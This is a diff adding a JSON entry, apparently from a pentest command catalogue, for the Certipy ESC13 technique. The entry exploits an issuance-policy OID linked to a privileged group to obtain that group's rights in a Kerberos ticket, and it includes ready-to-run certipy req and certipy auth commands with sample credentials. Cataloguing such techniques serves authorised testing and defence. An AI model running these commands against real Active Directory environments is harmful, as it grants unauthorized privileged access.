@@ -1,0 +1,17 @@
+{
+  "id": "certipy-esc13",
+  "name": "Certipy ESC13 (OID Group Link)",
+  "command": "certipy req -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca '<ca-name>' -template '<template>'",
+  "description": "ESC13: a template's issuance policy is linked to a privileged group via msDS-OIDToGroupLink. Enrolling adds the linked group SID to the resulting Kerberos ticket — instant group membership without ever touching the group object.",
+  "platform": "linux",
+  "requires": ["password"],
+  "protocols": ["ldap", "kerberos"],
+  "tags": ["certipy", "adcs", "esc13", "oid", "group-link"],
+  "references": [
+    { "title": "ESC13 writeup", "url": "https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53" }
+  ],
+  "examples": [
+    "certipy req -u jdoe@corp.local -p Pass -dc-ip 10.10.10.10 -ca CORP-CA -template ESC13Template",
+    "certipy auth -pfx jdoe.pfx -domain corp.local"
+  ]
+}
